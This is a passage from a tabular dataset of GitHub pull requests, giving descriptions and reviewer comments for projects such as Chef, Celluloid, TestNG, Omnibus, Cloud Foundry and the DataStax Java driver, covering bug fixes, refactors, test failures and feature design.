'@bensie we should use warn method for activesupport < 4.0\r\nhttp://rdoc.info/docs/rails/3.2.8/ActiveSupport/Deprecation#warn-class_method', '@bensie https://github.com/carrierwaveuploader/carrierwave/pull/1246', 'Thanks for stepping in and making this happen @bensie!']"
179,caskdata/tephra,29.0,"This fixes all versions of TransactionVisibilityFilter so that we only drop ""delete"" tombstones (Puts with empty values) when all store files are being read at the same time.  Makes the following changes:
* adds a flag to TransactionVisibilityFilter, set when doing a user scan or major compaction
* adds a test case that verifies ""delete"" tombstones are kept after a memstore flush","['Updated with some javadoc cleanup and clarified timestamps used in test', 'one more comment. LGTM otherwise', '@abaranau Updated with ScanType change, please re-review', 'LGTM']"
180,caskdata/tephra,72.0,,"[""Minor comments, otherwise LGTM. I haven't performed this process, and can't vouch for its accuracy or completeness."", '@awholegunch updated based on comments.\r\n\r\nLuckily I have gone through this process a few times, based on a checklist that I turned into this doc.', 'LGTM.']"
181,cbeust/testng,625.0,"

<!---
@huboard:{""order"":740.0,""milestone_order"":625,""custom_state"":""ready""}
-->
","[""First of all, the PR looks great but I have a couple of concerns about the idea in general:\r\n\r\n- Allowing multiple method interceptors brings up the concern about what order these interceptors will be run in.\r\n- The removal of `TestNG#setMethodInterceptor` is potentially breaking, I'd like this method restored with a trivial implementation (just add it to the list of interceptors).\r\n\r\nThoughts?\r\n"", ""> Allowing multiple method interceptors brings up the concern about what order these interceptors will be run in.\r\n\r\nIMHO it makes most sense to propagate the order in which the interceptors are listed in the XML file. That is both intuitive and easily configurable by the user\r\n\r\n> The removal of TestNG#setMethodInterceptor is potentially breaking, I'd like this method restored with a trivial implementation (just add it to the list of interceptors)\r\n\r\nMakes sense to me"", 'I updated the PR to restore the TestNG#setMethodInterceptor. Wrt ordering I agree with Jozef. Keep the order in which the interceptors are listed in the configuration xml or the order they are added to the list (programmatically). ', ':+1:', ""Mmmh it built and passed tests for me but Travis doesn't seem to be happy:\r\n\r\nhttps://travis-ci.org/cbeust/testng/jobs/68605615\r\n"", ""Hm I can't reproduce the test failure locally. One minor thing came to my mind https://github.com/tremes/testng/commit/aa1847f137d61e6ae7614a8e63eeb82f391ba21a but I am affraid this doesn't have any significant effect."", 'I tried something else https://github.com/juherr/testng/tree/fix-625-test without better results https://travis-ci.org/juherr/testng/jobs/68934441\r\nOf course, everything is working on my computer...', '> java.io.FileNotFoundException: /home/travis/build/juherr/testng/target/test-classes/methodinterceptors/multipleinterceptors/multiple-interceptors.xml (No such file or directory)\r\n\r\nhttps://travis-ci.org/juherr/testng/jobs/68955210', '@tremes The issue was tremes@aa1847f as you said. What do you think about my rework of the tests?', ""OK great. I just looked only briefly but yeah it's a good idea to make one abstract interceptor - less code. ""]"
182,celluloid/celluloid,547.0,"After https://groups.google.com/d/msg/celluloid-ruby/o1sm7gkMCsQ/iAVBP6EX4T4J
`0.16.5` is being bypassed as the release is far larger than previously planned, faster than planned.

#545 obsoleted, #520 closed, #535 will be completed here, #544 solved already... etc.
Closing in on a 10.17.01 release... abuse of the code is invited, and any feedback/fixes of course.","[""I've got this deployed on my development server, using a complex instance of `Celluloid`. And while the tests all pass, something isn't right. Digging into it more later, but we've gotten a lot moved forward today."", '@digitalextremist - update: no ETA yet, because I don\'t consider things ""working"" until all JRuby tests pass (testing on MRI only simply isn\'t testing at all).\r\n\r\nI\'ve changed my opinion - I\'d say that if only one Ruby had to be mandatory, I\'d make it JRuby (and not MRI). E.g. the reason JRuby ""hangs"" (in some places) is because you simply don\'t get a deadlock exception on JRuby (because a deadlock can only be certain on MRI due to the GIL). And ""real deadlocks"" are more likely on JRuby (so if something works on MRI, but hangs on JRuby - it\'s a deadlock bug in Celluloid, and not something wrong with JRuby).\r\n\r\nThere are major changes in the way things flow, so I won\'t start merging until JRuby is green. I\'ll branch off and rebase whatever branch you want, since I\'ll be cherry-picking things commit-by-commit anyway.\r\n\r\nDon\'t hold up because of me (since I have no ETA yet - still trying to get tests passing). I don\'t see any major merge issues here anyway (I branched off of refactor-test-suite to begin with). \r\n\r\nWhatever changes you make here, all I care about is all 0-16 tests either passing on MRI - or simply ""disabled"" (as opposed to ""removed""). If you need to remove tests or methods - it\'s best to mark them as such (since I\'ve reorganized some tests and made a few useless ones useful again).\r\n\r\nJust saying in case I\'m stuck for longer.', 'Wow, 2e0bbe6 was a critical issue, and my ""catch all"" overly-complex `Celluloid` implementation caught the case where a `Hash` being passed into `supervise_as` was interpreted as an options `Hash` and not sent along as an argument. This was the ""not quite right"" thing I was picking up on.', 'Will mop up errors popping up related to `SupervisionGroup` shortly; may just launch into #511 instead.', ""@e2 we now have another test that cannot be passed by `Spawner` -- I'm updating it to *not* keep sleeping threads, since it's not a pool. So we need a way to flag which tests conform to `Group` standard and which are special. I think `Group::Pool` is going to need additional tests to be outside the `it_behaves_like` so we can revert temporary methods and let `Spawner` be leaner."", '@e2 but the amendments you are making are overall *very* awesome.', ""@e2 `Group::*.to_a` can stay, but it's going down to the superclass."", 'Same with `each`', '@digitalextremist - I\'d aim for a leaner Spawner and Pool no sooner than JRuby works - some of the stuff is just essential for debugging when things go wrong. And too much is going wrong right now. \r\n\r\nNot to mention - some races are reproduceable only with ""extra stuff"" happening. Heisenbugs need to be squashed before ""refactoring"".\r\n\r\nOtherwise, `:each` should be sufficient as a enumerator. Though, I\'d wonder why someone even needs an enumerator. I\'d use a queue-based ""event listening"" (threads created, threads finished, etc.) - which could happen without any locks, anyway.', ""`StackDump` uses an enumerator, and so will `Group::Unlocker` but don't worry about thinning `Spawner` or `Pool` for now. Are you sure they're not Schr\xc3\xb6dinbugs? :)"", ""> Are you sure they're not Schr\xc3\xb6dinbugs? :)\r\n\r\nI wouldn't be surprised if some things worked simply because of JRuby bugs. (Once/if they'd get fixed, we'd uncover Schr\xc3\xb6dinbugs). Not saying JRuby is bad - just that a lot of stuff that's happening in celluloid isn't covered by JRuby tests."", '@e2 beware, something very large just broke, you may want to go get some coffee.', '@e2 problem solved, a downstream `each` definition was washing out my new superclass method.', ""I think it's time to go get coffee before I accidentally destroy the universe."", '@e2 we can leave this open, no longer bombard people with notifications for a while, and both write to abstractive/celluloid#4 onward. Once done there, we will merge abstractive/master into this branch again.\r\n\r\nYou have an invitation to write into that repository, and I will add new remotes to my local repository, or just start using a separate clone.', ""This is now the main focus of attention for `0.17.0` again. It's wildly out of focus but it'll be cleaned up over the next few days, then issue by issue, pr by pr concentration will resume clearly."", ""@tarcieri, @niamster ... this needs cleaning and probably some polishing up, which I will still do. But it is not only running without problems so far -- completely refactored as promised -- but it is also backported #614 and compatible with 0.16.0 expectant code. Whatever's left from this is to remove lingering `#de` comments, maybe some more consolidation of code used across gems, possibly a little bit of sanity checking, etc. We're basically there. @dilumnavanjana this would be good to thoroughly review.""]"
183,celluloid/celluloid-io,73.0,A refactor of the hosts class method.,"['\n[![Coverage Status](https://coveralls.io/builds/88255/badge)](https://coveralls.io/builds/88255)\n\nCoverage increased (+0%) when pulling **e976d7db661edb93ab529d1843f0193bd512402d on Dparker1990:refactor_hosts** into **17b2315c57aee541e04ff95cf3c590ee5a21dcbc on celluloid:master**.\n', ""Weird, travis is saying the build failed, but it is completely green on my system, I'll try and push another commit to fix this."", '\n[![Coverage Status](https://coveralls.io/builds/88662/badge)](https://coveralls.io/builds/88662)\n\nCoverage decreased (-0%) when pulling **eb1cc3479f0546a910178b743d5d8dcdd2f12c2c on Dparker1990:refactor_hosts** into **17b2315c57aee541e04ff95cf3c590ee5a21dcbc on celluloid:master**.\n', ""Still odd, I'll keep working at this, not sure why the build is failing on travis."", ""Figured out the issue, should've been obvious, will push fix soon."", '\n[![Coverage Status](https://coveralls.io/builds/89892/badge)](https://coveralls.io/builds/89892)\n\nCoverage remained the same when pulling **a54213e2c60bacc3908755067e29336b06401cf8 on Dparker1990:refactor_hosts** into **17b2315c57aee541e04ff95cf3c590ee5a21dcbc on celluloid:master**.\n', 'Cleared up silly mistakes and also cleaned up the branch. The method now takes advantage of `Resolv::Hosts`.', '\n[![Coverage Status](https://coveralls.io/builds/91680/badge)](https://coveralls.io/builds/91680)\n\nCoverage increased (+0%) when pulling **2a7188c914e178d114a221248cb2f5b63fa5d41f on Dparker1990:refactor_hosts** into **17b2315c57aee541e04ff95cf3c590ee5a21dcbc on celluloid:master**.\n', ""Build failed, I'll try a slightly different approach."", '\n[![Coverage Status](https://coveralls.io/builds/92681/badge)](https://coveralls.io/builds/92681)\n\nCoverage remained the same when pulling **e651eaa63bd5b6afbe84a0c56b35d045ad16d173 on Dparker1990:refactor_hosts** into **6004dff0aedfc2b25c55329c6db52fb5ae5fbb85 on celluloid:master**.\n', 'Build is passing now, was able to completely eliminate that method, also snuck in another refactor along the way! :smiley: This has been a fun series of refactors. :thumbsup: \r\n\r\nThe way the Ruby implementation of `Resolv::Hosts` works is that upon initialize a hash is built for hostnames => addrs, however at the very end of the initialize they do a `reverse!`, which is why the `.pop` is needed, so that we are making sure we are looking up the first one which was found, this ensures identical behavior to the method that was removed.', '\n[![Coverage Status](https://coveralls.io/builds/92860/badge)](https://coveralls.io/builds/92860)\n\nCoverage remained the same when pulling **266a2b01834d891e1bee88e380f659866552a651 on Dparker1990:refactor_hosts** into **6004dff0aedfc2b25c55329c6db52fb5ae5fbb85 on celluloid:master**.\n', ""Hey there, looks like I forgot about this one... I'll try to review it tonight if I remember! ;)"", ""No worries! I wasn't sure if you were waiting on another PR or something to pull this in, haha."", 'Nope, sometimes I just forget and these things slip by the wayside :(', 'LGTM :thumbsup:']"
184,chef/chef,2922.0,"Change a lot of the arrays in check_package_state to hashes indexed by the package name.   There was recursion in check_package_state when dealing with virtual packages which was being handled incorrectly and winding up adding the results from interrogating the virtual packages into the arrays that check_package_state builds which was throwing off the indexes in those arrays.

Its still a bit ugly, but this is a bit clearer and feels like minimum viable patch to fix the brokenness before shipping.  Need to do some remaining cleanup for 12.2.0

fixes #2914 ","[""Sorry, I've been out of the country and off the grid (I saw in my massive backlog of email some bugs about this). Tomorrow's my only day at work before leaving for SCALE, I'll try to review this before I leave."", 'This is still incomplete, needs specs added for the cases that I fixed.', 'spec in https://github.com/chef/chef/pull/2929', 'commits squashed and rebased on master, will fail travis due to ohai 8.1.0 bug', ':+1: ']"
185,chef/chef,3060.0,"We are seeing failures in our CI relating to state not being cleaned
up in a previous run:

```
  1) Chef::Provider::User::Useradd action :create when the user already exists and home directory is updated and manage_home is enabled moves the home directory to the new location
     Failure/Error: user_resource.run_action(:create)
     Mixlib::ShellOut::ShellCommandFailed:
       user[TEST USER RESOURCE] (dynamically defined) had an error: Mixlib::ShellOut::ShellCommandFailed: Expected process to exit with [0], but received '12'
       ---- Begin output of [""usermod"", ""-d"", ""/home/bar"", ""-m"", ""cf-test""] ----
       STDOUT:
       STDERR: usermod: directory /home/bar exists
       ---- End output of [""usermod"", ""-d"", ""/home/bar"", ""-m"", ""cf-test""] ----
       Ran [""usermod"", ""-d"", ""/home/bar"", ""-m"", ""cf-test""] returned 12
     # ./lib/chef/mixin/shell_out.rb:56:in `shell_out!'
     # ./lib/chef/provider/user/useradd.rb:42:in `manage_user'
     # ./lib/chef/provider/user.rb:137:in `block in action_create'
     # ./lib/chef/mixin/why_run.rb:52:in `call'
     # ./lib/chef/mixin/why_run.rb:52:in `add_action'
     # ./lib/chef/provider.rb:180:in `converge_by'
     # ./lib/chef/provider/user.rb:136:in `action_create'
     # ./lib/chef/provider.rb:145:in `run_action'
     # ./lib/chef/resource.rb:561:in `run_action'
     # ./spec/functional/resource/user/useradd_spec.rb:336:in `block (4 levels) in <top (required)>'
```","[':+1: ', ':+1: ', ':+1: ']"
186,chef/chef,3109.0,"This provider was broken in just the right ways when  it was merged that it sort of worked. There were references to methods that didn't exist that just happened not to get called ever.

Since we just released this, and it does not work as is, I'm going to change a few things:
- I've simplified the candidate_version search...I didn't quite understand what the original was wanting to do

- This package provider had a weird usage for source (completely inconsistent with the rest of our package providers), and it was not happy with @jaymzh's patch https://github.com/jaymzh/chef/commit/1f380f9f180f39581f2e124061af1ee927a23e0c. I've decided to explicitly make `source` unsupported for this provider

- It now correctly deals with multiple valid candidates by failing the run instead of picking one

Fixes https://github.com/chef/chef/issues/3096

cc @chef/client-core ","[""@chef/client-core This kind of works now. I've added the things that do not work to `define_resource_requirements`. These enhancements are available for community contributions, but since openbsd is not a supported platform, I will not be spending more time adding those."", ':+1: on shipping this with the existing 12.1.2 bugfix releases .', ':+1:', ':+1:', ""Summary of internal chat discussion: I'm borderline :-1: without some regression tests. There are valid reasons why we can't make the tests as good as we really want to, but a handful of unit tests would go a long way to preventing future regression and documenting the edge cases we've learned we will encounter in the real world."", ""That said, the code changes seem fine, so throw in some tests and I'm :+1: "", 'Yeah, specs then :+1: ', ""@danielsdeleo \r\nI've added more specs.\r\nThe missing functionality is marked with pending, so it will fail successfully until somebody implements it"", ':shipit: ', ':+1: ', ':+1: ']"
187,chef/chef,3271.0,"This branch changes the following (see relevant commit message for details on each):
+ Fixed bug in Chef::Key related to create.
+ Set sane default for chef_server_root.
+ Implements `knife user key create` and `knife client key create`.

Ping @chef/lob ","['@chef/client-core ', ""My stuff is style nits - other than the `0` which perhaps is just some part of the knife plugin infrastructure I don't know about. This looks pretty solid to me. I looked largely because I'm interested in this feature, but someone with more knife knowledge should comment on your redundancy question and general knife-y-ness. But in general I'm :+1: "", ""Thanks for the review! I'll have the rest of the knife key related commands out shortly."", ""Overall this is good.  I really like getting chef_server_root into our core config.\r\n\r\nThe amount of duplication between the two knife commands makes me wonder if your key_create class should actually just be a class that we include in each plugin.  You could then use the `included` method to manage ensure the joint options got set:\r\n\r\nhttps://github.com/chef/knife-ec-backup/blob/master/lib/chef/knife/ec_base.rb#L26-L80\r\n\r\nHowever, a little duplication in knife commands isn't the end of the world, so the only only comment of mine that I see as blocking is the return 1 vs exit 1 issue."", '@stevendanna The reasoning behind the way the code is structured is to have a clear separation of code that deals with handling CLI options/args and code that handles an action. In ChefDK I\'ve found that it makes it much easier to build a command that combines a few operations by composing the ""service"" objects. It also makes testing a lot easier because you only need to verify that the CLI-level code talks to the service code correctly, while it\'s easy to use DI to pass dependencies (like HTTP API client stuff) into the service object.\r\n\r\nFinally, I think this sort of design will make it more attractive for 3rd party authors to write scripts/libraries in a way we feel comfortable supporting. I find it pretty terrible that people use knife CLI code as library code, because knife operates at the CLI layer where it\'s acceptable to print directly to the output streams, exit if input is invalid, etc. That kind of behavior is generally unacceptable for a library. Having a separate service object fixes that issue by creating a clear line between the two kinds of code.', ':+1: test for config stuff would be nice to have and it looks like most of the infrastructure is in place in `spec/unit/config_spec.rb`', '@danielsdeleo Thanks for the summary there.  That makes total sense.']"
188,chef/chef,3297.0,"Abstracted out a bunch of common tests with the key create code to reduce redundancy.

Ping @chef/lob ","['@chef/client-core ', ':+1: ', "":+1: \r\n\r\nI do wonder if the API allows listing keys without providing an actor, which could lead to something like ```knife user key list --all``` or even ```knife key list``` and ```knife key search```, but it looks like Chef::Key doesn't support that now anyway."", ""Yeah, the API is scoped to actors at the moment, but if that's something we would see as a useful feature in the future we should chat about it and look into prioritization :)""]"
189,chef/chef,3624.0,"Adds a Property class to encapsulate property behavior with getters, setters, and defaults; stores identity and desired_state on them; drives identity_attr and state_attrs based on that.","['@coderanger I believe this is now fully in line with your comments on the old PR, mind taking a look when you get a chance?', '![Simpsons dancing](https://33.media.tumblr.com/af0e3700ad1c5e4945678696e0809577/tumblr_mmdqmlVlcV1s7r5kwo1_500.gif)', 'Looks ready to ship in my book! (give or take tests)']"
190,chef/omnibus,430.0,"This changeset introduces the following features:

  - Omnibus creates a version manifest in a text format (intended
    for humans) without depending on omnibus-software. 

  - Omnibus creates a version manifest in a JSON format (intended
    for machines). 

  - Omnibus can ingest a user-provided, JSON-formatted version
    manifest during the build process. The JSON manifest will be
    used to lock the software sources and version used when
    fetching. Please see the following sections for more details.

* Manifest Ingestion

Ingesting an externally created manifest is NOT intended to be the
standard mode of operation for an omnibus built project. Most projects
should continue to use the `default_version` method of software
definitions and the `override` method of project definition to control
which version of a software get built.

This feature is included to support improvements to the build
pipelines for opscode-omnibus (Chef Server) and other Chef Software,
Inc managed projects by:

  - allowing the opscode-omnibus software to use floating constraints,
    ensuring new features in API services are immediately integrated
    into the Chef Server package.

while still

  - allowing users to rebuild a specific version of an omnibus built
    project from source.

  - ensuring all versions of all software in a given build are captured
    in a format that can be commited to source control.

  - providing a possible base for automated generation of other
    release-related artifacts such as change logs.

Chef Software, Inc reviewers should note that the manifest will NOT be
ingested at any point in the standard build pipeline.

* Text Manifest Format

For backwards compatibility, the text version manifest is produced in
exactly the same manner as the previous version manifest produced by
omnibus-software.

* JSON Manifest Format v1

The first version of the manifest format takes the following form:

```json
{
    ""manifest_format"" : MANIFEST_FORMAT_NUMBER,
    ""software"" : {
    ""SOFTWARE_NAME"" : {
      ""described_version"": STRING(see below)
      ""locked_version"": STRING(see below)
      ""locked_source"": HASH(see below)
      ""source_type"": ""path""|""url""|""git""|""project_local""
    }
}
```

  - `described_version` is the user-specified version of the software
    (via default_version or an override) at the time of the build.

  - `locked_version` is the calculated version of the source artifact
    that was fetched. For git sources this will be a git ref and may
    differ from the described_version.

  - `locked_source` is the source parameters used to fetch the source
    artifact.

  - `source_type` specifies the type of source fetcher that was used.

Only non-null fields are present in the manifest.  Software with a
`project_local` source type may not have a source or either version
field. Software with a `path` source type may not have a either
version field.

* Build Reproducibility

When ingesting a manifest, omnibus will do the following:

- Use the `locked_version` and `locked_source` when fetching the build
artifact.

- Proceed with the usual omnibus build procedures

This procedure does NOT guarantee that a given build will produce a
functionally equivalent artifact.  This is especially true for

- projects using path or project_local based software

- projects using software where the build steps also pull down new
software (bundle install)

- projects using software where the build steps produce different
output depending on environmental factors (time, state of the build
machine, etc)","['Can we merge this now :troll:\n\n> On Feb 13, 2015, at 07:39, Steven Danna <notifications@github.com> wrote:\n> \n> DO NOT MERGE ME. THIS IS FOR DISCUSSION.\n> \n> You can view, comment on, or merge this pull request online at:\n> \n>   https://github.com/chef/omnibus/pull/430\n> \n> Commit Summary\n> \n> WIP WIP WIP Use manifest internally for fetching softwares\n> File Changes\n> \n> M lib/omnibus/cli.rb (4)\n> M lib/omnibus/fetcher.rb (94)\n> M lib/omnibus/fetchers/git_fetcher.rb (23)\n> M lib/omnibus/fetchers/net_fetcher.rb (15)\n> M lib/omnibus/fetchers/null_fetcher.rb (9)\n> M lib/omnibus/fetchers/path_fetcher.rb (7)\n> M lib/omnibus/health_check.rb     (2)\n> A lib/omnibus/manifest_entry.rb (12)\n> M lib/omnibus/project.rb (51)\n> M lib/omnibus/software.rb (42)   \n> M spec/unit/fetchers/git_fetcher_spec.rb (7)\n> M spec/unit/fetchers/net_fetcher_spec.rb (3)\n> M spec/unit/fetchers/path_fetcher_spec.rb (3)\n> Patch Links:\n> \n> https://github.com/chef/omnibus/pull/430.patch\n> https://github.com/chef/omnibus/pull/430.diff\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub.\n> \n', ""@stevendanna Excited about this feature, overall a great start! Let's be sure to add some functional test coverage also."", ""@stevendanna This is looking good. A couple of final questions for you:\r\n\r\n1. In the name of keeping things simple: Should we just make both the TXT and JSON manifests mandatory and always generate them at your suggested default paths (e.g. `INSTALL_DIR/version-manifest.*`)? I'm not sure we want to make something like this configurable. I also don't see a downside to all Omnibus projects gaining this useful feature.\r\n2. Can we add functional test coverage for `Omnibus::NetFetcher` and `Omnibus::PathFetcher`? I want to make sure we don't incur any future regressions on this feature."", ""Awesome. One thing I'd recommend to change. At the time you load the project you can know whether you're going to be ingesting a manifest. So you could pass it to the Project's constructor, and then to individual software constructors, which would remove a lot of switch-y behavior from the interfaces of these things. Specifically, `Fetcher#use_manifest_entry`, `Project#manifest`, `Software#fetch` each involve an outsider telling some existing object to flip a bit to a very different mode of operation. I like to keep stuff like this in the constructor to ensure that the behavior changes are more strictly contained in each object. Also it's less likely you could cause an ordering issue since each object knows from the time it's created how it's supposed to behave.\r\n\r\n"", '@danielsdeleo I\'ve just pushed a change that hopefully moves this closer towards the changes you recommended.  Currently, the only real ""decision point"" where there is a change between a user-provided manifest and a self-generated manifest is here:\r\n\r\nhttps://github.com/chef/omnibus/pull/430/files#diff-2753487ba152ae43f78b4da0c96b8e44R102\r\n\r\nThat is hard to do in the constructor itself without more major refactoring.  A software just doesn\'t know enough about itself to create a manifest entry until it evaluates the software definition on disk.\r\n\r\nA nice impact of this change is that the fetchers are now completely ignorant of the manifest.  They take a manifest-like thing in their constructor, but then just assume that the information they received in their constructor is absolutely correct.  Any symbolic-version -> real-version resolution should be preformed by the user (i.e. Omnibus::Software) using the helper method Fetcher.resolve_version.\r\n\r\n@schisamo With the new design above, the functional tests moved around a bit. The fetchers don\'t care too much about the manifest, but I did add tests to ensure the #resolve_version function works for each class and some top level Fetcher tests.\r\n\r\nRegarding making with_text_manifest and with_json_manifest the defaults, I have no objection as long as we are OK with changing the build output people will get on upgrade. ', ""This LGTM. It took a bit of spelunking to detect whether the ordering changed much, but this is a good step in the right direction. I'm :+1: x 1000 for trying this out on the Chef Server."", ""@stevendanna Let's just make the generation of `version-manifest.txt` and `version-manifest.json` the default behavior. It simplifies the code (and projects opting into use it) and fits in with Omnibus's opinionated approach. These manifests are useful and there is really no reason you wouldn't want them!\r\n\r\nWe'll just treat this as a new feature which shouldn't break anyone in a backward compatible way.\r\n"", ':+1: ']"
191,chef/omnibus,499.0,"Replete with inline commentary. I've seen ""::"" filenames from the git and perl manual page files thus far.","['Would it be possible to add a test for this?', 'Tests added! @scotthain ', 'And logging.', 'LGTM', '/cc @chef/omnibus-maintainers ', ':+1: ', '@curiositycasualty Is this change still needed?', 'Closing in favor of https://github.com/chef/omnibus/pull/575']"
192,cloudfoundry/cloud_controller_ng,147.0,Keep track of the filename so the admin knows what was uploaded,"['Rebased on latest code.\r\nRandom failure in some other part of CC.', '@MarkKropf Can this feature be merged?\r\n\r\n-CF Community Pair (@atomanyih & @sclevine) ', 'Failure is unrelated.  Its your common SSL Cipher failure.', 'I did play around with the import_attributes.  The problem is when the buildpack_bits controller needs to update the key or filename.  If its not in the import, then you have to manually update the fields and drive save rather that use the update_with_hash or other methods.  I can do this change but I feel it is correct for the model to expose it and restrict the controllers from doing so.']"
193,cloudfoundry/uaa,118.0,First proposed solution to https://www.pivotaltracker.com/story/show/87310482,"[""Hey fhanik!\n\nThanks for submitting this pull request! I'm here to inform the recipients of the pull request that you've already signed the CLA.\n"", 'We have created an issue in Pivotal Tracker to manage this. You can view the current status of your issue at: https://www.pivotaltracker.com/story/show/87338468.', ""@fraenkel Thanks for your feedback. We're in a bit of a pickle here, cause we are dealing with contradictions. The Oauth2 specification demands that query parameters be encoded using application/x-www-form-encoded. The URI spec itself, defines plus sign as a delimiter, while the new HTTP spec RFC 7230 (that came after Oauth 2) points back to RFC 3896 URI spec for exact syntax. So they are contradicting each other.\r\n\r\nIt's all about timing of writing specs :) So in theory, we couldn't use UriComponentsBuilder as encoder because of OAuth 2 specification. But if we now started using form encoding like we are supposed to (form encoded in the URI) I'm sure all hell would break lose. I think for now, we'll stick with what we are doing, and just solve the double encoding issue.""]"
194,code-mancers/invoker,35.0,,[]
195,code-mancers/invoker,76.0,,[]
196,codecation/trailmix,105.0,"![allyourentry](https://cloud.githubusercontent.com/assets/65323/4551958/d3fa8080-4e79-11e4-81fb-f40a7dd3afa6.jpg)
","['@r00k All feedback addressed sir.', 'Wonder if everything is in utc here.', 'Thanks for the solid feedback @gabebw :sparkles: ']"
197,codetriage/codetriage,115.0,"When a user signs up / signs in with an invalid e-mail address, they
will be taken to the user edit page and given a flash message
instructing them to use a valid e-mail address.

In handling this case, another hidden source of confusion has been
partially fixed -- when a user registers and their account does not
pass Devise's validations, the errors are swallowed and they are
redirected to the root path with no flash messaging. We now accept any
e-mail address provided by GitHub via OAuth and create the account
anyways, but redirect them to a page where they can set their e-mail
address on their own.

Closes #110.","['I like it! Good job @jroes, I made a few comments on the code but I leave it up to @schneems to decide :) :+1: ', ""Folded conditionals based on @JonRowe's feedback. Ready for review."", 'Calling Dr @schneems to the ER....', 'Revised again, paging @schneems ']"
198,collectiveidea/json_spec,82.0,"Hi Steve,
  Please let me know what you think about the tests.
Thanks,
Beth","[""Travis is failing with your changes. I'm not available to dig into it but please take a look. I'll also leave some feedback on the code itself. Thank you!"", 'Hi Steve,\r\n  Thank you for the feedback.  I have made the corrections.   Do you think I should add more tests?\r\nThanks again,\r\nBeth', 'Looks great, Beth. Would you please squash the commits where necessary. Because of the course correction, there are several commits which no longer apply and some commits are just tiny tweaks. Squashing the commits into one or two more feature-focused commits will help keep the Git history readable. Thank you!', 'Hi Steve,\r\n  I was able to squash the commits into 2 commits.  Anything else I could do?\r\nThanks again for your time and help,\r\nBeth', ""No, looks great. Thank you. I'll merge shortly when I have time to ship a new release."", 'Version 1.1.4 released. Thank you!']"
199,datastax/java-driver,369.0,"Use cases are:

* global (per cluster): use a CodecRegistry class to retrieve codecs, configurable on a per-cluster basis (e.g. to deserialize CQL timestamps as Joda or Java 8 classes)
* particular (per table/column): override the global codec on a per table/column basis (e.g. to deserialize a text CQL type as a JSON object)

The 2nd use case will only be possible for `GettableData` instances (`BoundStatement`s and `Row`s basically). It will not be available for `SimpleStatement`s nor `BuiltStatement`s (because these do not have any information about types). In other words, customizing serialization on a per-column basis will only be feasible when using prepared statements.

Summary of changes:

Maven
* Guava HAS to be 16.0.1 or higher, see [this](https://code.google.com/p/guava-libraries/issues/detail?id=1635) for details.

TypeCodec
* Now public API, most static methods moved to `CodecRegistry`;
* Now a codec can only handle one Java type and one CQL type, so some existing codecs have been refactored;
* New inspection methods to verify if a codec can handle specific types (`accepts(X)`).

DataType
* No more references to `TypeCodec`, the logic is transferred to `CodecRegistry` (because it's now dynamic);
* Most static methods that serialize and deserialize have been removed;
* The `javaClass` attribute has been removed;

CodecRegistry
* New class that contains all the known codecs;
* Has a builder;
* Has a cache for Java/CQL types to codecs;
* Can be associated with a Cluster: `builder.withCodecRegistry()`;
* Can be retrieved in a Cluster: `cluster.getConfiguration().getCodecRegistry()`;
* The default registry is `CodecRegistry.DEFAULT_INSTANCE`;
* Throws `CodecNotFoundException`.

Serializing values
* `SimpleStatement` and `BuiltStatement` versions of `getValues()`: now use a unified `convert()` method in `CodecUtils`;
* `BoundStatement.bind()`: guesses the best codec;
* `BoundStatement` methods `setBool()`, `setInt()` etc: retrieve the exact codec as implied by the method contract (i.e. `setBool()` will look for a codec that handles `Boolean <-> cbool` exclusively). _These methods can only be used if appropriate codecs are available (e.g. the default ones)_.
* Alternatively, `BoundStatement` has new `setObject(Object, X)` methods that accept a Java type as a second parameter.

Deserializing values
* New methods `getObjec(int, X)` and `getObject(String, X)` in `GettableData`: retrieve and object using the provided java type; the appropriate codec is looked up in the cluster's `CodecRegistry`;
* Methods `getBool()`, `getInt()`, etc. in `AbstractGettableData`: deserialize with exact codec as implied by the method contract. _These methods can only be used if appropriate codecs are available (e.g. the default ones), otherwise they would throw `ClassCastException`s_.
* All methods in GettableData instances will try to find an overriding codec for a particular table/column

Tests
* See `TypeCodecXXXTest` and `CodecRegistryTest` for examples of JSON serialization and fancy codecs

TODO
* Routing Keys: check if they can work with custom codecs
* Tokens: check if they can work with custom codecs","[""> Guava HAS to be 16.0.1 or higher\r\n\r\nWe've stuck to 14 so far because of [spark-cassandra-connector](https://github.com/datastax/spark-cassandra-connector), so we should talk with them before any update."", 'Why do we need `Statement(Cluster)`?\r\n\r\n`BoundStatement` is built from a `PreparedStatement`, so we should be able to propagate the `CodecRegistry`.\r\n\r\nRegarding `SimpleStatement` and `BuiltStatement`, I think we should delay serialization to `makeRequestMessage` (and, in both cases, pick the first codec that handles the java type).', ""> I think we should delay serialization to makeRequestMessage\r\n\r\nIf we delay serialization until makeRequestMessage then RegularStatement.getValues will have to return Object\\[\\] (and getRoutingKey too, probably).\r\nI will give it a try to see if it doesn't break too much code."", ""> TokenFactory: hard-coded codecs\r\n\r\nThat's what we want there (deserializing known CQL types to known Java types, the user has no say as to what `Token#getValue()` returns)."", 'Closing as this PR is not up-to-date anymore and this feature is likely to be introduced in 2.2 only, see #387.']"
200,diaspora/diaspora,4414.0,"![always_show_control_icons](https://f.cloud.github.com/assets/3798614/987131/c54bd6c2-08e5-11e3-8333-c24f8653f8d9.png)
","[""> I think the intent was that the icons would show if you hover over the whole element (stream element / comment). I think we should fix that behavior instead, always showing them doesn't look good for me.\r\n\r\nAgreed, this would be the ideal situation."", 'Anything I missed? This should be ready to merge now.', 'Looking good, thank you!']"
201,diaspora/diaspora,4814.0,"Fixes #4811, related to #4466 and #4424 
![](https://f.cloud.github.com/assets/3798614/2387364/2014e788-a936-11e3-9455-b7d9753b6f70.png)

Todo: 
- ~~port the aspect membership dropdown to Bootstrap and include it~~
- ~~javascript: Changes in notifications dropdown should include the notifications view~~
- ~~tests~~
